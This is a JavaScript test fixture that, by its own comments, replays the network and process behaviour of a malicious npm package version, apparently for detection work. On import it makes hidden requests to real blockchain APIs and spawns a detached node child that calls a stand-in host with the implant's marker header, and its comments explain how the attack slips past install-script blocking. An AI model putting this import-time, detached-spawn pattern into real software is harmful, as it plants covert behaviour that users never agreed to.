// Replay fixture — impacted version. BENIGN: this file performs the *network
// and process shape* of the @joyfill/layouts@0.1.2-2773.beta.0 implant
// (Socket, 2026-07-28) and nothing else. It downloads no payload, decodes
// nothing, evaluates nothing, and never contacts the attacker host
// 23[.]27[.]13[.]43 — the boot request goes to httpbin.org instead.
//
// What the real implant did, and what is reproduced here:
//   * runs on module load (CommonJS entrypoint), not from a lifecycle hook,
//     so `npm install --ignore-scripts` does not prevent it;
//   * reads a pointer from a Tron address, with an Aptos account as fallback;
//   * fetches a BNB Smart Chain transaction to resolve the next stage;
//   * spawns a detached `node -e` child that requests a boot payload and
//     sends the marker header `Sec-V: A9-0135-3`.
const https = require('https')
const { spawn } = require('child_process')

const gridLayout = (fields, columns) => {
  const out = []
  fields.forEach((field, index) => {
    out.push({ field, row: Math.floor(index / columns), column: index % columns })
  })
  return out
}

const get = (url, headers) => {
  try {
    const req = https.get(url, { headers: headers || {} }, (res) => res.resume())
    req.on('error', () => {})
    req.setTimeout(4000, () => req.destroy())
  } catch {
    /* never break the import */
  }
}

// Stage 1 — blockchain-backed dispatch, in the importing process.
get('https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions?limit=1')
get('https://fullnode.mainnet.aptoslabs.com/v1')
get('https://bsc-dataseed.binance.org/')

// Stage 1b — the detached branch: a `node -e` child, unref'd, that requests a
// boot payload with the implant's marker header. Stand-in host.
try {
  const child = spawn(
    process.execPath,
    [
      '-e',
      "const h=require('https');const r=h.get('https://httpbin.org/anything',{headers:{'Sec-V':'A9-0135-3'}},(s)=>s.resume());r.on('error',()=>{});r.setTimeout(4000,()=>r.destroy());",
    ],
    { detached: true, stdio: 'ignore', windowsHide: true },
  )
  child.unref()
} catch {
  /* never break the import */
}

module.exports = { gridLayout, version: '0.1.2-2773.beta.0' }
